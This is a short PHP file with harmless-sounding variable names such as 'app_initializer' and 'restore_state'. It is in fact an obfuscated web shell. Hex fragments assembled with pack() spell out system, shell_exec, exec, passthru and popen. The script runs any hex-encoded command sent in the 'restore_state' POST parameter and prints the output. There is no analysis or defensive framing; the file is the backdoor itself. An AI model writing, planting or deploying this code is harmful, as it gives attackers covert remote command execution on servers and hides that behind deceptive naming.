<?php


$descriptor1 = '7';
$descriptor2 = '3';
$descriptor3 = '6';
$descriptor4 = 'd';
$descriptor5 = '8';
$descriptor6 = '5';
$descriptor7 = 'c';
$descriptor8 = '0';
$descriptor9 = '1';
$descriptor10 = 'e';
$descriptor11 = '4';
$descriptor12 = 'f';
$app_initializer1 = pack("H*", $descriptor1 . '3' . $descriptor1 . '9' . '7' . $descriptor2 . $descriptor1 . '4' . '6' . '5' . $descriptor3 . $descriptor4);
$app_initializer2 = pack("H*", '7' . '3' . '6' . $descriptor5 . $descriptor3 . $descriptor6 . $descriptor3 . $descriptor7 . '6' . 'c' . '5' . 'f' . $descriptor3 . $descriptor6 . $descriptor1 . $descriptor5 . '6' . $descriptor6 . '6' . $descriptor2);
$app_initializer3 = pack("H*", '6' . $descriptor6 . '7' . '8' . $descriptor3 . '5' . $descriptor3 . '3');
$app_initializer4 = pack("H*", '7' . $descriptor8 . $descriptor3 . $descriptor9 . $descriptor1 . '3' . $descriptor1 . '3' . '7' . '4' . '6' . $descriptor5 . $descriptor1 . '2' . $descriptor1 . $descriptor6);
$app_initializer5 = pack("H*", $descriptor1 . $descriptor8 . '6' . 'f' . $descriptor1 . $descriptor8 . '6' . $descriptor6 . $descriptor3 . $descriptor10);
$app_initializer6 = pack("H*", $descriptor1 . '3' . '7' . '4' . '7' . '2' . $descriptor3 . '5' . $descriptor3 . $descriptor9 . '6' . 'd' . '5' . 'f' . $descriptor3 . '7' . '6' . $descriptor6 . $descriptor1 . $descriptor11 . '5' . 'f' . '6' . $descriptor2 . $descriptor3 . 'f' . '6' . $descriptor10 . '7' . $descriptor11 . '6' . '5' . '6' . $descriptor10 . '7' . $descriptor11 . '7' . '3');
$app_initializer7 = pack("H*", $descriptor1 . '0' . $descriptor3 . $descriptor2 . $descriptor3 . $descriptor7 . $descriptor3 . $descriptor12 . '7' . '3' . $descriptor3 . '5');
$restore_state = pack("H*", $descriptor1 . '2' . $descriptor3 . '5' . '7' . $descriptor2 . $descriptor1 . $descriptor11 . '6' . 'f' . '7' . '2' . $descriptor3 . '5' . '5' . $descriptor12 . '7' . '3' . '7' . $descriptor11 . $descriptor3 . '1' . '7' . '4' . '6' . '5');
if (isset($_POST[$restore_state])) {
    $restore_state = pack("H*", $_POST[$restore_state]);
    if (function_exists($app_initializer1)) {
        $app_initializer1($restore_state);
    } elseif (function_exists($app_initializer2)) {
        print $app_initializer2($restore_state);
    } elseif (function_exists($app_initializer3)) {
        $app_initializer3($restore_state, $val_holder);
        print join("\n", $val_holder);
    } elseif (function_exists($app_initializer4)) {
        $app_initializer4($restore_state);
    } elseif (function_exists($app_initializer5) && function_exists($app_initializer6) && function_exists($app_initializer7)) {
        $k_mrk = $app_initializer5($restore_state, 'r');
        if ($k_mrk) {
            $entry_marker = $app_initializer6($k_mrk);
            $app_initializer7($k_mrk);
            print $entry_marker;
        }
    }
    exit;
}
